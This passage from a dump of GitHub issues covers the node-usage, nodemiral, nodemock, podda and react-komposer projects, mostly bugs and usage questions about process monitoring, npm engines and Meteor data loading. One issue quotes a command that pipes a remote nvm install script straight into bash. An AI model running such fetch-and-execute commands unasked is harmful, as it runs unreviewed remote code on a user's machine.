Parent process CPU is 0%, but it has child process with cpu usage 1%. How do I monitor cpu usage with child process ?
</Body>
    <State>open</State>
    <Comment>
      <Owner>BenasPaulikas</Owner>
      <Body>Any ideas ?
</Body>
    </Comment>
  </Issue_278>
  <Issue_279>
    <Repository>node-usage</Repository>
    <Title>Unsupported OS</Title>
    <Owner>arunoda</Owner>
    <Body>At the run test.js form examples:
[Error: Unsupported OS. Please submit an issue: https://github.com/arunoda/node-usage/issues] undefined.
My OS is Windows 7 Ultimate 64bit.
</Body>
    <State>open</State>
    <Comment>
      <Owner>wk-cof</Owner>
      <Body>Same issue here.
OS is Win 7 x64.
</Body>
    </Comment>
    <Comment>
      <Owner>edencorbin</Owner>
      <Body>same issue here, Win 10 x64....</Body>
    </Comment>
  </Issue_279>
  <Issue_280>
    <Repository>node-usage</Repository>
    <Title>Why is the ps memory output getting multiplied by 1024?</Title>
    <Owner>arunoda</Owner>
    <Body>https://github.com/arunoda/node-usage/blob/master/lib/providers/ps.js#L37

``` javascript
    return {
      memory: parseInt(result[1]) * 1024,
      memoryInfo: {
        rss: parseFloat(result[1]) * 1024,
        vsize: parseFloat(result[2]) * 1024
      },
      cpu: parseFloat(result[3])
    };
```

From the README.md

```
{
    memory: 100065280, // in no of bytes
    memoryInfo: {
        rss: 15966208, // resident size memory in bytes
        vsize: 3127906304 // virtual memory size in bytes
    },
    cpu: 10.6 // in percentage
}
```

The ps output for both linux and osx is in bytes already. Why are the values being returned with a 1024 multiplier?
</Body>
    <State>open</State>
    <Comment>
      <Owner>jportela</Owner>
      <Body>According to the man pages, they are in units of 1024 bytes, as per #9 

https://developer.apple.com/library/mac/documentation/Darwin/Reference/ManPages/man1/ps.1.html

On OSX this value is OK, for linux I believe it is using another provider: https://github.com/arunoda/node-usage/blob/master/lib/providers/linux.js
</Body>
    </Comment>
  </Issue_280>
  <Issue_281>
    <Repository>node-usage</Repository>
    <Title>node 0.11.* error (cannot find pre-compiled binary for: linux/x64/v0.11.14)</Title>
    <Owner>arunoda</Owner>
    <Body>2014-10-06 17:58 -07:00: usage: cannot find pre-compiled binary for: linux/x64/v0.11.14
2014-10-06 17:58 -07:00: usage: failed loading provider `linux`

happens on all node 0.11

I'm not sure if this is a compatibility with next version of node or if this is an nvm install issue:

installed via

```
curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash;
nvm install 0.11.14;
```

This is for CentOS 6.5
</Body>
    <State>open</State>
    <Comment>
      <Owner>atomantic</Owner>
      <Body>Ah, looked at the code and I see we need to add a compiled/linux/x64/0.11/sysinfo.node

How is that bin compiled?
</Body>
    </Comment>
    <Comment>
      <Owner>ev0rtex</Owner>
      <Body>I had the same issue but with io.js v2.0.0
</Body>
    </Comment>
    <Comment>
      <Owner>patricknelson</Owner>
      <Body>I had a similar issue. I think this is built using `node-gyp` so if you remove your `node_modules` and try `npm install` it should recompile for your system. 

Side note: The reason I ended up encountering _this_ issue was because I had an error elsewhere in my `npm install` and somehow ended up with `usage` but it didn't compile this binary for me. I hit this issue again after switching to a different VM (CentOS 7 vs 6) without recompiling. This also helped since it required C++11 https://edwards.sdsu.edu/research/c11-on-centos-6/
</Body>
    </Comment>
  </Issue_281>
  <Issue_282>
    <Repository>node-usage</Repository>
    <Title>cpu value return NaN or Infinity ?</Title>
    <Owner>arunoda</Owner>
    <Body>On my Linux machine the cpu value sometime return NaN or Infinity. What does it mean? 
</Body>
    <State>open</State>
    <Comment>
      <Owner>mmarchini</Owner>
      <Body>I had the same problem here and I solved it keeping an interval of at least 1 second between two calls of usage.lookup. 

Take a look at #1, reading this helped me solve my problem.
</Body>
    </Comment>
  </Issue_282>
  <Issue_283>
    <Repository>nodemiral</Repository>
    <Title>In shell script, read command just hangs with no output</Title>
    <Owner>arunoda</Owner>
    <Body>Hello,&#13;
I'm currently making a plugin for meteor-up that uses some shell scripts that are passed with nodemiral.&#13;
I remarked that shell script execution blocks on `read -p` instruction and doesn't print the read command prompt i wrote. Even if i press `Enter` it does nothing i juste get a newline printed in the terminal the execution doesn't move on.&#13;
ex:&#13;
```&#13;
#!/bin/bash&#13;
echo this works&#13;
read -p "Please write something: " response //the execution stops here, the prompt message isn't even shown&#13;
echo Finish!   &#13;
```&#13;
&#13;
Please help me. I'm new to shell scripting.</Body>
    <State>open</State>
    <Comment>
      <Owner>nzomedia</Owner>
      <Body>Hi, I just realized that nodemiral was for task automation, so i'll understand if it doesn't support interaction. But still, any explanation about this issue is welcome. I'll check the source code to know how things works. I'll close this issue with an answer if i find one.</Body>
    </Comment>
  </Issue_283>
  <Issue_284>
    <Repository>nodemiral</Repository>
    <Title>Running multiple commands on remote server</Title>
    <Owner>arunoda</Owner>
    <Body>I was looking at executing multiple remote commands using nodemiral. My requirement is to run the following two operations on the remote m/c.
- cd to a specific directory
- run a script file in that directory.

If I create a session, and run these two commands one after the other, it didn't work for me.  The first command "cd &lt;path&gt;" succeeded, but when executing the 2nd, it still shows default path.  Of course, I have taken care of async callbacks (I am executing the 2nd command, on the callback of the first).

So, I was thinking that I should use a local script which embeds these two commands, so that I can run it on the remote.  But the directory to which I need to change to (the "cd" argument) is dynamic, and so is the script name.

I modified my local script file to be like this.

``` shellscript
cd $1
sh $2
```

Again this doesn't work because, the executeScript method doesn't take command line arguments.

This was when I discovered there are undocumented API TasklistRunner().  I just saw this a while ago, so I didn't yet try it.  

The question is... "Is this the way to go for running multiple commands" ? Am I sailing in the right direction?  Why is this API not yet documented...
</Body>
    <State>open</State>
    <Comment>
      <Owner>macroramesh6</Owner>
      <Body>I have this same issue. Please share if you find anything
</Body>
    </Comment>
    <Comment>
      <Owner>kolarski</Owner>
      <Body>I believe you can do multiple commands like that: 
`session.execute('cd ~;ls', function(err, code, logs) {console.log(logs.stdout);});`
</Body>
    </Comment>
    <Comment>
      <Owner>crapthings</Owner>
      <Body>@rvnath use &amp;&amp; ?
</Body>
    </Comment>
  </Issue_284>
  <Issue_285>
    <Repository>nodemock</Repository>
    <Title>Enable a name to be assigned to a mock</Title>
    <Owner>arunoda</Owner>
    <Body>Currently the only descriptive name on a mock is the function being mocked.

However if two mocks are both mocking the same function name (e.g. 'error') there isn't a way to tell from the assert error message which 'error' function was not called.
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Hmm, Interesting.
How do we provided the description.
I've given some possible ways. Add some ways you prefer.

``` javascript
nodemock.mock('foo', 'this is the discription').return(100);
```

``` javascript
nodemock.of('testing the description').mock('foo').returns(130).
```
</Body>
    </Comment>
    <Comment>
      <Owner>kgilpin</Owner>
      <Body>I am coming from Ruby where an option hash is common; so another possibility is:

```
nodemock.mock({name:"my name"})`

nodemock.mock("foo", {name:"my name"})
```

which leaves the possibility of other options as well. But I also like your chaining (second one). The first one I think is not workable because:

```
nodemock.mock('description')
```

is ambiguous whether 'description' is the description or the method to mock.
</Body>
    </Comment>
    <Comment>
      <Owner>realistschuckle</Owner>
      <Body>@kgilpin If you still want this feature, you can find it in the "newer" repo over at https://github.com/realistschuckle/nodemock. I shimmed in a new method that does not break the current signature of the library. It allows you to do this:

``` JavaScript
var nm = require('nodemock')
  , mock = nm.named('myFabulousMock').mock('someMethod').return(100)
  ;

mock.assert(); // Prints out that myFabulousMock.someMethod() did not get called.
```
</Body>
    </Comment>
  </Issue_285>
  <Issue_286>
    <Repository>nodemock</Repository>
    <Title>Unit tests are failing</Title>
    <Owner>arunoda</Owner>
    <Body>Following test methods are failing:

&#10004; testMultipleEntriesForOneMethod
method call for: 'foo()' with params: (10, 30) was not executed!

&#10004; testAssertFailsSameMethod
method call for: 'bar()' with params: (10, 30) was not executed!

&#10004; testAssertOK
method call for: 'bar()' with params: (10, 30) was not executed!

&#10004; testAssertThrowsOK
method call for: 'bar()' with params: (10) was not executed!

&lt;!---
@huboard:{"order":2.25}
--&gt;
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>I don't see tests are failing.
</Body>
    </Comment>
    <Comment>
      <Owner>oveddan</Owner>
      <Body>You don't see it locally or you don't see it in the example posted message?
</Body>
    </Comment>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Actually these logs are showing what is happens on the behind.
This the test itself get passed :)
Can't you see this &#10004;
</Body>
    </Comment>
    <Comment>
      <Owner>oveddan</Owner>
      <Body>Yes but the check is misleading.  A mocked condition in the test was never invoked, so you get the error message.  In the unit test you should be invoking every set-up mock. The tests themselves are incorrect and masking the error;  they should be failing.
</Body>
    </Comment>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Ok! Now I got it. You give it a fix.
Thanks.
Pull this request too.
</Body>
    </Comment>
  </Issue_286>
  <Issue_287>
    <Repository>podda</Repository>
    <Title>Fails to install on npm 5</Title>
    <Owner>arunoda</Owner>
    <Body>The `engines` field in `package.json` is currently specifying `"npm": "^3.0.0"`, which causes installation to fail on npm 4 and 5.</Body>
    <State>open</State>
    <Comment>
      <Owner>emilyhorsman</Owner>
      <Body>This isn't a great solution, but while trying to install `@storybook/react` which depends on `podda`, I set `engine-strict=false` in my `.npmrc`. https://docs.npmjs.com/misc/config#engine-strict </Body>
    </Comment>
  </Issue_287>
  <Issue_288>
    <Repository>podda</Repository>
    <Title>Allow this library to work with Node 8 / NPM 5</Title>
    <Owner>arunoda</Owner>
    <Body>Currently installing this with NPM 5 fails with an 'Unsupported engine' error.</Body>
    <State>open</State>
    <Comment>
      <Owner>bengummer</Owner>
      <Body>Raised issue #6 for this</Body>
    </Comment>
    <Comment>
      <Owner>achingbrain</Owner>
      <Body>It would be great if @arunoda could merge this &amp; release it.</Body>
    </Comment>
    <Comment>
      <Owner>danielduan</Owner>
      <Body>@ajs139 @bengummer @achingbrain &#13;
I've published the package under `@storybook/podda` with this fix. Feel free to use that version and submit any future bug fixes there.</Body>
    </Comment>
  </Issue_288>
  <Issue_289>
    <Repository>react-komposer</Repository>
    <Title>Allow this repository to work with NPM 5</Title>
    <Owner>arunoda</Owner>
    <Body>Currently installing this project with NPM 5 results in an "Unsupported engine" error. This allows later versions of NPM to use this project.</Body>
    <State>open</State>
    <Comment>
      <Owner>danielduan</Owner>
      <Body>We forked, fixed, and published this package as `@storybook/react-komposer` if you're interested in using it. @ajs139 </Body>
    </Comment>
  </Issue_289>
  <Issue_290>
    <Repository>react-komposer</Repository>
    <Title>this._stop is not a function</Title>
    <Owner>arunoda</Owner>
    <Body>Using compose function with custom dataloader function.&#13;
Everythime i start the app this error shows up&#13;
![screen shot 2017-06-21 at 12 34 14 pm](https://user-images.githubusercontent.com/29251322/27371339-0290c27e-567e-11e7-9ff0-41335782227a.png)&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>trmjoa</Owner>
      <Body>Hi,&#13;
&#13;
I just had the same error. Since other might have similar issues I'm posting my solution here:&#13;
&#13;
Make sure your dataloader(s) is not returning anything. The only valid return value is a function that when called (on unmount for  instance) will stop the current loading logic. A common error is to return a promise or a object from the dataloader. If you do  that, then you will have this error.</Body>
    </Comment>
  </Issue_290>
  <Issue_291>
    <Repository>react-komposer</Repository>
    <Title>Composer rendering container twice</Title>
    <Owner>arunoda</Owner>
    <Body>I packed the container into a composer. The composer is subscribing to data, as soon as the subscription is ready the composer gets called again and sends the data via `onData(null, props)` to the container. When the container is mounted the composer runs again and triggers an update of the component.&#13;
&#13;
What is triggering the reload of the composer? I am not changing any props of the composer?&#13;
&#13;
P.S. I am using Meteor.</Body>
    <State>open</State>
    <Comment>
      <Owner>crapthings</Owner>
      <Body>do u have subscribe inside your container ?&#13;
if so you should wait for ready</Body>
    </Comment>
    <Comment>
      <Owner>crapthings</Owner>
      <Body>subscribe ready is reactive source
it will be switching between false to true
and if your props are from collection cursor it will reactive while ddp sends message

you have  to wait subscribe ready most time

because ddp message from publish cursor sends one by one

or use this.added changed removed  erc to customize your ddp manually </Body>
    </Comment>
  </Issue_291>
  <Issue_292>
    <Repository>react-komposer</Repository>
    <Title>Question: How to pass data to the container (ex: change parameters of the subscription)</Title>
    <Owner>arunoda</Owner>
    <Body>Hello,&#13;
&#13;
I'm using react-komposer with Meteor. Basically, my code looks like this &#13;
```&#13;
const composer = ({ params }, onData) =&gt; {&#13;
  const runsSub = Meteor.subscribe('runs.view', params._id);&#13;
  const teamsSub = Meteor.subscribe('teams.list');&#13;
&#13;
  if (runsSub.ready() &amp;&amp; teamsSub.ready()) {&#13;
    const run = Runs.findOne();&#13;
    const teams = Teams.find().fetch();&#13;
    onData(null, { run: run, teams: teams });&#13;
  }&#13;
};&#13;
export default composeWithTracker(composer, Loading)(EditRun);&#13;
```&#13;
&#13;
This works well, but let's say I want to add a third subscription that should update whenever a team (from the team subscription) is selected on screen.&#13;
&#13;
`const devSub = Meteor.subscribe('developers.team.list', "THE SELECTED TEAM ID");`&#13;
&#13;
What's the best way to achieve this?</Body>
    <State>open</State>
    <Comment>
      <Owner>codeHatcher</Owner>
      <Body>You need to pass the new 'params' as the prop from the parent component of the container you have shown. I think the Meteor Chef site has some examples of this</Body>
    </Comment>
  </Issue_292>
  <Issue_293>
    <Repository>react-komposer</Repository>
    <Title>Error: Tyring set data after component(Container(ChartData)) has unmounted.</Title>
    <Owner>arunoda</Owner>
    <Body>I keep seeing this error, for a dataLoader function which is very fast.&#13;
&#13;
Is there a chance the dataLoader is trying to set the data into the component before it is actually mounted?</Body>
    <State>open</State>
    <Comment>
      <Owner>davidworkman9</Owner>
      <Body>Also getting this when using a controlled component and someone types quickly.</Body>
    </Comment>
    <Comment>
      <Owner>Dartv</Owner>
      <Body>Not sure about v2 but if you look at the code in v1 it actually sets data in `constructor` and not in `componentWillMount` which will cause errors if you try to dispatch some redux actions there. Maybe it's related to this issue.</Body>
    </Comment>
    <Comment>
      <Owner>flippyhead</Owner>
      <Body>Anyone happen to figure this out? Following the recommended setup we see this after routing (with react router) and it causes the app to completely break. </Body>
    </Comment>
    <Comment>
      <Owner>flippyhead</Owner>
      <Body>Actually we found this was caused by the mapper function for redux not returning the result of subscribe (which is a function that unsubscribes from the store). </Body>
    </Comment>
    <Comment>
      <Owner>kieckhafer</Owner>
      <Body>Any solution to this? We are also seeing this issue. We have a sidebar that has our komposer container inside of it. When we close the sidebar, the container seems to re-render as it's closing.&#13;
&#13;
In our container, we fetch our data via a `Meteor.call`. This call is seeming to happen again during this re-render when we close our sidebar, and I assume the component is unmounted before the data is sent back, causing this same issue.&#13;
&#13;
If I provide static data, instead of doing the Meteor call, then everything is fine.</Body>
    </Comment>
    <Comment>
      <Owner>McPo</Owner>
      <Body>I am also running into this issue.&#13;
&#13;
Here is some pseudo code.&#13;
&#13;
```&#13;
const exampleComposer = (props, onData) =&gt; {&#13;
 doSomething(() =&gt; onData(..));&#13;
 return cancelDoSomething;&#13;
};&#13;
```&#13;
&#13;
I am making a network call in doSomething. If I navigate away and the component becomes unmounted, I would be expecting cancelDoSomething to be called, but it appears that it is not. (I have verified this via logging). Instead I am getting the following error. &#13;
&#13;
`Error: Tyring set data after component`&#13;
&#13;
The solution for me at the moment, is to just catch the error that was thrown. Which isn't great.</Body>
    </Comment>
  </Issue_293>
  <Issue_294>
    <Repository>react-komposer</Repository>
    <Title>shouldSubscribe not working</Title>
    <Owner>arunoda</Owner>
    <Body>Hi,&#13;
&#13;
the option shouldSubscribe does not seem to work.&#13;
&#13;
When I have this ...&#13;
&#13;
```&#13;
const options = {&#13;
    shouldSubscribe: (currentProps, nextProps) =&gt; {&#13;
        console.log(currentProps, nextProps);&#13;
        return false;&#13;
    }&#13;
};&#13;
&#13;
compose(trackerLoader(myLoader), options)(MyComponent);&#13;
```&#13;
&#13;
... the console.log is never triggered, nor does "return false" prevent the loader from reloading.&#13;
&#13;
Am I doing something wrong or is this a bug?</Body>
    <State>open</State>
    <Comment>
      <Owner>MaxTwentythree</Owner>
      <Body>Same issue with 'propsToWatch' btw...</Body>
    </Comment>
    <Comment>
      <Owner>nkahnfr</Owner>
      <Body>Hi,&#13;
&#13;
It's working fine for me.&#13;
&#13;
Please note ```shouldSubscribe``` is never called on the first run since you need to subscribe to initialize the container.&#13;
The function is called when one or more watched properties change for an "initialized" container.&#13;
Hope it helps.</Body>
    </Comment>
  </Issue_294>
  <Issue_295>
    <Repository>react-komposer</Repository>
    <Title>Unsubscribing to publication</Title>
    <Owner>arunoda</Owner>
    <Body>Based on the [Meteor document](https://guide.meteor.com/data-loading.html#stopping-subscriptions), specifically:&#13;
&#13;
&gt;When you are subscribing, it is very important to ensure that you always call .stop() on the subscription when you are done with it.&#13;
&#13;
Based on the document this is done on automatically on `getMeteorData`:&#13;
&gt;However, if you call `Meteor.subscribe()` conditionally inside a reactive context (such as an `autorun`, or `getMeteorData` in React) or via `this.subscribe()` in a Blaze component, then Meteor&#8217;s reactive system will automatically call `this.stop()` for you at the appropriate time.&#13;
&#13;
Is this done automatically on `react-komposer` or do we need to do it manually?&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>reggieboyYEAH</Owner>
      <Body>No need to unsubscribe, it is automatically handled.&#13;
https://github.com/arunoda/react-komposer/issues/5</Body>
    </Comment>
  </Issue_295>
  <Issue_296>
    <Repository>react-komposer</Repository>
    <Title>How many subscriptions is too many for this?</Title>
    <Owner>arunoda</Owner>
    <Body>Does react-komposer reuse subscriptions, i.e. doing something like:&#13;
&#13;
Meteor.subscribe('test');&#13;
Meteor.subscribe('test');&#13;
Meteor.subscribe('test');&#13;
Meteor.subscribe('test');&#13;
Meteor.subscribe('test');&#13;
Meteor.subscribe('test');&#13;
&#13;
So can I have many small React components with containers? Or should I have one big container, and then have many small react components inside it, with less overhead</Body>
    <State>open</State>
    <Comment>
      <Owner>janzenz</Owner>
      <Body>I have somewhat similar question. Mine is about nested components, does it cause performance issue if we repeatedly connect each nested component, let's say with similar data or any data that can be derived from the `ParentContainer`? In Redux this is acceptable and encouraged I don't know with Komposer.&#13;
&#13;
For example&#13;
&#13;
```&#13;
function dataLoader() {&#13;
  Meteor.subscribe('test');&#13;
}&#13;
&#13;
compose(dataLoader())(ParentContainer)&#13;
&#13;
function dataLoader() {&#13;
  Meteor.subscribe('test');&#13;
}&#13;
&#13;
compose(dataLoader())(GreatGrandChildContainer)&#13;
```</Body>
    </Comment>
  </Issue_296>
  <Issue_297>
    <Repository>react-komposer</Repository>
    <Title>Errors thrown within child components are not bubbling up</Title>
    <Owner>arunoda</Owner>
    <Body>Question:&#13;
&#13;
If I compose an App component like this `compose(composeFunc)(App)`.  Then, inside the App component there is a `&lt;Header /&gt;`.  Inside the Header, there is a `&lt;Logo /&gt;` component.  The Logo component is a dumb component:&#13;
&#13;
```&#13;
import React, {Component} from 'react'&#13;
&#13;
const Logo = ({ name }) =&gt; (&#13;
    &lt;span&gt;{name}&lt;/span&gt;&#13;
)&#13;
&#13;
export default Logo&#13;
&#13;
```&#13;
That all works, but say I change the 'name' prop to.. 'names' (which should throw an error)...all that happens is the default "Loading..." displays but no error is logged to the console. Below is the code, with the change, that should throw an error:&#13;
&#13;
```&#13;
import React, {Component} from 'react'&#13;
&#13;
const Logo = ({ name }) =&gt; (&#13;
    &lt;span&gt;{names}&lt;/span&gt;&#13;
)&#13;
&#13;
export default Logo&#13;
&#13;
```&#13;
&#13;
When `&lt;App /&gt;` is **NOT composed** , the error from `Logo` displays correctly in the console.&#13;
&#13;
`Logo.jsx:3 Uncaught ReferenceError: names is not defined`&#13;
&#13;
&#13;
Any ideas why the error is not getting logged or bubbled up to the composer? &#13;
&#13;
Thanks :) &#13;
&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Better if you can send me a sample app, where I can see try this locally.</Body>
    </Comment>
  </Issue_297>
  <Issue_298>
    <Repository>react-komposer</Repository>
    <Title>FlowRouter SSR + ReactKomposer</Title>
    <Owner>arunoda</Owner>
    <Body>My app relies heavily on FlowRouter &amp; ReactKomposer and I'd love a way for them to work together while doing SSR. This may be possible but there isn't any documentation out there. &#13;
&#13;
From your SSR section in the React Komposer readme:&#13;
&#13;
```&#13;
function postDataLoader(props, onData, env) {&#13;
   if (isSSR) {&#13;
      const data = fetchData();&#13;
      onData(null, data);&#13;
      return;&#13;
   }&#13;
&#13;
   const stopSubscription = watchData((data) =&gt; {&#13;
      onData(null, data);&#13;
   });&#13;
   return stopSubscription;&#13;
}&#13;
```&#13;
&#13;
How do we detect that the route is being rendered via SSR and thus flag isSSR to true?&#13;
&#13;
What does the watchData function look like?&#13;
&#13;
Coming from this kind of setup:&#13;
&#13;
```&#13;
function mapMeteorToProps(props, onData) {&#13;
    const groupId = props.groupId&#13;
    if (Meteor.subscribe('Viewer').ready() &amp;&amp; Meteor.subscribe("ClientEmails", groupId).ready() &amp;&amp; Meteor.subscribe("LockExceptions").ready()) {&#13;
        [blah blah blah...]&#13;
        onData(null, {clients, cardZoomClient, lockExceptions, viewer})&#13;
    }&#13;
}&#13;
```</Body>
    <State>open</State>
    <Comment>
      <Owner>achtan</Owner>
      <Body>@stewartcelani hi, any luck with ssr ?</Body>
    </Comment>
    <Comment>
      <Owner>stewartcelani</Owner>
      <Body>@achtan Unfortunately not. Will probably do a rewrite and switch to react-router + rxjs or apollo.</Body>
    </Comment>
    <Comment>
      <Owner>neooleg</Owner>
      <Body>It seems isSSR mentioned within README.md is "alias" of Meteor.isServer</Body>
    </Comment>
    <Comment>
      <Owner>neooleg</Owner>
      <Body>However, watchData() function is still not found.&#13;
&#13;
@arunoda could you please comment about it?</Body>
    </Comment>
  </Issue_298>
  <Issue_299>
    <Repository>react-komposer</Repository>
    <Title>Data not passed to the component on change</Title>
    <Owner>arunoda</Owner>
    <Body>Hi, I'm trying to use mobx with `react-komposer`. So far I managed to pass data from the mobx store and fire actions to change that data. The initial data comes to the container. Also when I change that data, the changed data come to the container. But the container does not pass the new data to the component. Any idea why this is happening?

My container :

```
import {useDeps, composeAll} from 'mantra-core';
import composeWithMobx from '../libs/with_mobx';
import MainLayout from '../components/main_layout.jsx';

const onPropsChange = ({ context }, onData) =&gt; {
  let { loginModal } = context().Store.core.users;

  onData(null, {
    loginModal,
  });
};

export const depsMapper = (context, actions) =&gt; ({
  context: () =&gt; context
});

export default composeAll(
  composeWithMobx(onPropsChange),
  useDeps(depsMapper)
)(MainLayout);
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>THPubs</Owner>
      <Body>Just found the issue. I was setting the new value in `componentDidMount`. In other instances, it worked but when I change the value inside `componentDidMount` the container won't pass the value to the component. I fixed it by adding the value changing function inside a setTimeout. Any idea why this is happening?
</Body>
    </Comment>
  </Issue_299>
  <Issue_300>
    <Repository>react-komposer</Repository>
    <Title>[BUG] Child component isn't rerendered by parent's context change</Title>
    <Owner>arunoda</Owner>
    <Body>Hello,
Today I noticed following issue: when child was wrapped by komposer component, then child isn't rendered by the change of parent's context. 
Here is an example https://github.com/mzygmunt/komposer-issue.
Thank you for your hard work on react-komposer!
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>I think this is something we need to expect with 2.x - https://github.com/kadirahq/react-komposer/issues/123
</Body>
    </Comment>
  </Issue_300>
  <Issue_301>
    <Repository>react-komposer</Repository>
    <Title>Issues when using with react-native-router-flux</Title>
    <Owner>arunoda</Owner>
    <Body>Hello! I'm having some issues when u sing with react-native-router-flux
I think there are two critical points:
- When a scene changes, componentWillUnmount is not called, therefore, the function to stop the subscription is not called and the subscription does not stop.
- The Router is passing a lot of props to my components, so whenever I change routes, the function of all containers crated with komposer rerun because of props changes (I'm not sure about this, but I can confirm that they are rerunning because console.loging inside the composer function)

This is causing performance issues on my app as I navigate throught my routes

Any ideas on how to fix this ?

More detailed info:

RestaurantesContainer.jsx

``` js
function composer(props, onData) {
  console.log('--props on RestaurantesContainer---')
  console.log(props)
  const handle = Meteor.subscribe('restaurantes')
  const restaurantesFields = {
    fields: {
      logoUrl: 1,
      backgroundUrl: 1
    }
  }
  if (handle.ready()) {
    const restaurantes = Meteor.collection('restaurantes').find({}, restaurantesFields)
    onData(null, {
      restaurantes
    })
  }

  return () =&gt; handle.stop()
}

export default composeWithTracker(composer, Loading, Error)(RestaurantesList)
```

App.js

``` js
class App extends Component {
  render() {
    return (
        &lt;Router&gt;
          &lt;Scene key="drawer" component={DrawerContainer} menuItems={menuItems}&gt;
            &lt;Scene key="root" navBar={NavBar}&gt;
              &lt;Scene
                initial={true}
                key="restaurantes"
                title="Restaurantes"
                component={RestaurantesContainer} /&gt;
          &lt;/Scene&gt; 
         &lt;/Scene&gt;
       &lt;/Router&gt;
     )
   }
}
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Could you give a try for v2 of React Komposer?
We just released it. Check the README.
</Body>
    </Comment>
  </Issue_301>
  <Issue_302>
    <Repository>react-komposer</Repository>
    <Title>How to get key value through callback on props in react komposer? </Title>
    <Owner>arunoda</Owner>
    <Body>I am trying to get the key value associated with user selection on a list in dataList -- the data in dataList is populated through a container and composed through react-komposer.

In the parent component,
&lt;ContainerDataList orgName={this.state.orgName} onOrgSelect={this.onOrgSelect.bind(this)}/&gt;

In the container .js file,

import {composeWithTracker} from 'react-komposer';
import OrgNamesDataList from '/client/components/OrgNamesDataList.jsx';

composer = (props, onData) =&gt; {

  console.log("inside container composer outside -- " + props.orgName);

```
  console.log("inside container composer");
  const handle = Meteor.subscribe(...);
  if (handle.ready()) {
    const orgNames = orgs.find().fetch();
    onData(null, {orgNames});
  }
```

};
export default composeWithTracker(composer)(OrgNamesDataList);

In OrgNamesDataList.jsx,

import React from 'react';
const DataItem = ({dataObj}) =&gt;(
    &lt;option key={dataObj._id} value={dataObj.legalName + ' [' + dataObj.city + ', ' + dataObj.state + ', ' + dataObj.country + ']'}/&gt;
);

const OrgNamesDataList = ({orgNames}) =&gt;(
        &lt;datalist id="orgSearchList"&gt;
          {orgNames.map((topic) =&gt; (
            &lt;DataItem ref="orgNameSelected" key={topic._id} dataObj={topic}/&gt;
          ))}
        &lt;/datalist&gt;
);
export default OrgNamesDataList;

---

The above code is working -- but, I don't know how I can use the callback function on props to get the key associated with the value rendered through the container. Could you help please?
</Body>
    <State>open</State>
    <Comment>
      <Owner>macrozone</Owner>
      <Body>can you fix the code-indention? this would make it easier to read. Also there seems to be missing pieces, so I don't know exactly what the problem is.
</Body>
    </Comment>
  </Issue_302>
  <Issue_303>
    <Repository>react-komposer</Repository>
    <Title>Rerendering nested container after subscription data</Title>
    <Owner>arunoda</Owner>
    <Body>I have a DraftJS instance which is receiving it's initial state from a Mongo Subscription sitting in a parent container - 

`export const composer = ({context, clearErrors, contentId}, onData) =&gt; {
  const {Meteor, LocalState, Collections} = context();
  if (Meteor.subscribe('contents', contentId).ready()) {
    const contentObject = Collections.Contents.findOne(contentId);
    onData(null, {contentObject});
  }
  const error = LocalState.get('SAVING_ERROR');
  onData(null, {error});

  // clearErrors when unmounting the component
  return clearErrors;
}`

But the DraftJS component is getting rendered before Subscription and not getting rerendered after receiving data. Any idea how to rerender my DraftJS component or any work around?
</Body>
    <State>open</State>
    <Comment>
      <Owner>lfades</Owner>
      <Body>I am not an expert, but I think I can help.

see 2 solutions, this is the first and the simplest:

``` js
export const composer = ({context, clearErrors, contentId}, onData) =&gt; {
  const {Meteor, LocalState, Collections} = context();

  // your component only be displayed when the subscription is loaded
  if (Meteor.subscribe('contents', contentId).ready()) {
    const contentObject = Collections.Contents.findOne(contentId);
    const error = LocalState.get('SAVING_ERROR');

    onData(null, {contentObject, error});
  }

  return clearErrors;
}
```

The other solution is using 2 composer:

``` js
export const composer = ({context, contentId}, onData) =&gt; {
  const {Meteor, Collections} = context();

  if (Meteor.subscribe('contents', contentId).ready()) {
    const contentObject = Collections.Contents.findOne(contentId);
    onData(null, {contentObject});
  }
}

export const errorComposer = ({context, clearErrors}, onData) =&gt; {
  const {LocalState} = context();

  const error = LocalState.get('SAVING_ERROR');
  onData(null, {error});

  return clearErrors;
}

export default composeAll(
  composeWithTracker(errorComposer),
  composeWithTracker(composer),
  useDeps()
)(Component);
```

`errorComposer` runs when `composer` is ready, meaning that only when the subscription is ready.
</Body>
    </Comment>
    <Comment>
      <Owner>anothermohit</Owner>
      <Body>Thanks for the time @Goluis . Actually, I am not yet sure how but this worked for me yesterday - 

`if (!postId) {
    onData(null, {});
  } else if (Meteor.subscribe('posts.single', postId).ready()) {
    const post = Collections.Posts.findOne(postId);
    onData(null, {post});
  } else {
    const post = Collections.Posts.findOne(postId);
    if (post) {
      onData(null, {post});
    } else {
      onData();
    }
  }`

I think passing nothing in the last else doesn't render the component so it waits for the subscriptions to complete before rendering. Right explanation for this would be wonderful if anyone can explain please.
</Body>
    </Comment>
  </Issue_303>
  <Issue_304>
    <Repository>react-komposer</Repository>
    <Title>dispatch action in componentDidMount () doesn't get picked up by onData() immedaitely</Title>
    <Owner>arunoda</Owner>
    <Body>Trying to implement a clock component. Once the component is rendered, I wish it to immediately show current time. I have this component:

```
import React, { PropTypes } from 'react';

class Time extends React.Component {
  static propTypes = {
    time: PropTypes.string.isRequired,
    updateTime: PropTypes.func.isRequired,
  }

  componentDidMount() {
    const { updateTime } = this.props;
    const time = new Date().toString();
    updateTime(time);
    console.log(time);
  }

  render() {
    const { time } = this.props;
    return (
      &lt;div&gt;{time}&lt;/div&gt;
    );
  }
}


export default Time;
```

 and container code:

```
import { useDeps } from 'react-simple-di';
import { composeAll, compose } from 'react-komposer';
import Time from '../../components/account/clock';

export const composer = ({ context, updateTime }, onData) =&gt; {
  const { Store } = context();

  Store.subscribe(() =&gt; {
    const { time } = Store.getState().clock;
    onData(null, { time });
  });

  const { time } = Store.getState().clock;
  onData(null, { time: time.toString() });

  const handle = setInterval(() =&gt; {
    const datetimeString = new Date().toString();
    updateTime(datetimeString);
  }, 1000);

